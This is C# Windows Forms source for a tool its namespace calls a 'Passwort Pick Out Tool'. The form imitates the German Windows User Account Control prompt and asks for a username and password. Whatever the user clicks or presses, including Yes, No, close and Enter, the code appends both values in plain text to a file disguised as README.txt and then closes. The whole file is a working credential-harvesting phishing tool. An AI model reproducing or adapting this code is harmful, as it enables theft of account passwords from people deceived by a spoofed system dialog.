using System;
using System.IO;
using System.Drawing;
using System.Windows.Forms;

namespace Passwort_Pick_Out_Tool
{
    public partial class FormBenutzerkontensteuerung : Form
    {
        #region Initialize Component
        public FormBenutzerkontensteuerung()
        {
            InitializeComponent();

            // In the tab order, the "TextboxPassword" is set to 0!

            /* 
             * The "PasswordChar" is initially set because the "TextboxPassword" is initially selected and 
             * therefore no condition under "TextboxPassword_Enter" and "TextboxPassword_Leave" applies.
             */ 
            TextboxPassword.PasswordChar = '*';
        }
        #endregion

        #region LabelClose
        private void LabelClose_Click(object sender, EventArgs e)
        {
            FileWriteLine();
        }
        #endregion

        #region Clear/Set watermark for "TextboxBenutzername"
        private void TextboxBenutzername_Enter(object sender, EventArgs e)
        {
            if (TextboxBenutzername.Text == "  Benutzername")
            {
                // Clear watermark.
                TextboxBenutzername.ForeColor = SystemColors.WindowText;
                TextboxBenutzername.Text = "";
            }
        }

        private void TextboxBenutzername_Leave(object sender, EventArgs e)
        {
            if (TextboxBenutzername.Text == "")
            {
                // Set watermark.
                TextboxBenutzername.ForeColor = SystemColors.GrayText;
                TextboxBenutzername.Text = "  Benutzername";
            }
        }
        #endregion

        #region Clear/Set PasswordChar and watermark for "TextboxPassword"
        private void TextboxPassword_Enter(object sender, EventArgs e)
        {
            if (TextboxPassword.Text == "  Kennwort")
            {
                TextboxPassword.PasswordChar = '*';

                // Clear watermark.
                TextboxPassword.ForeColor = SystemColors.WindowText;
                TextboxPassword.Text = "";
            }
        }

        private void TextboxPassword_Leave(object sender, EventArgs e)
        {
            if (TextboxPassword.Text == "")
            {
                TextboxPassword.PasswordChar = '\0';

                // Set watermark.
                TextboxPassword.ForeColor = SystemColors.GrayText;
                TextboxPassword.Text = "  Kennwort";
            }
        }
        #endregion

        #region "Enter key press"-function
        private void TextboxPassword_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
                FileWriteLine();
        }
        #endregion

        #region "Button click"-functions
        private void ButtonJa_Click(object sender, EventArgs e)
        {
            FileWriteLine();
        }

        private void ButtonNein_Click(object sender, EventArgs e)
        {
            FileWriteLine();
        }
        #endregion

        #region Write text from "TextboxPassword" in file
        private void FileWriteLine()
        {
            // Declare Variable
            StreamWriter File = new StreamWriter(@"D:\ddd\README.txt", true);

            // Write text from "TextboxPassword" in file and close the file.
            File.WriteLine
            (
                Environment.NewLine +
                "Benutzername: " + TextboxBenutzername.Text 
                + Environment.NewLine +
                "Kennwort: " + TextboxPassword.Text
            );
            File.Close();

            // Close Program
            this.Close();
        }
        #endregion
    }
}